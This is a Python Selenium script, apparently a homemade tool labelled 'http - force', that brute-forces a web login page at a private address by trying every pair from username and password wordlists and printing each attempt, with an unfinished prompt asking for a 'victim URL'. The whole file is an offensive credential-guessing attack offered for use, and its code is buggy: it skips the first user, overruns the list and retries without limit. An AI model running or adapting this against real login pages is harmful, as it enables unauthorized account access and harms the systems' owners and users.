from selenium import webdriver
from selenium.webdriver.common.by import By
import time, os
from webdriver_manager.chrome import ChromeDriverManager
import pyfiglet


def login(username, password):
	try:
		inputuser = web.find_element(By.XPATH, "/html/body/div/form/div/div[2]/div[1]/input")
		inputuser.send_keys(username)
		inputpass = web.find_element(By.XPATH, "/html/body/div/form/div/div[2]/div[1]/div[3]/input[1]")
		inputpass.send_keys(password)
		
		loginbtn = web.find_element(By.XPATH, "/html/body/div/form/div/div[2]/div[2]/div/button").click()
	except:
		time.sleep(10)
		web.refresh()
		time.sleep(0.5)
		login(username, password)

arrayU = []
arrayP = []


with open("usuarios.txt") as file:
	for line in file:
		arrayU.append(line.rstrip())


with open("contrasenyas.txt") as file:
	for line in file:
		arrayP.append(line.rstrip())


web = webdriver.Chrome(ChromeDriverManager().install())
web.get('https://192.168.0.2:8443')
time.sleep(2)

configAv = web.find_element(By.XPATH, "/html/body/div/div[2]/button[3]").click()
acceder = web.find_element(By.XPATH, "/html/body/div/div[3]/p[2]/a").click()
web.find_element

time.sleep(1)

i = 0
if True:
	while i < len(arrayU):
		j = 0
		i = i + 1
		while j < len(arrayP):
			login(arrayU[i], arrayP[j])
			print("user: " + str(arrayU[i] + "\tpass: " + str(arrayP[j])))
			time.sleep(2)
			j = j + 1

	
def main():

	ascii_banner = pyfiglet.figlet_format("http - force")
	print(ascii_banner)

	print("Introduce la URL victima:", end="")
	url = input()
	print("Ruta de diccionario de usuarios:", end="")
	url = input()
	print("Ruta de diccionario de contraseñas:", end="")
	url = input()

	print("________________________________________")
	print("XPath of username input: ", end="")
	userInput = input()

	print("XPath of password input: ", end="")
	passInput = input()

	print("XPath of login button: ", end="")
	buttonInput = input()




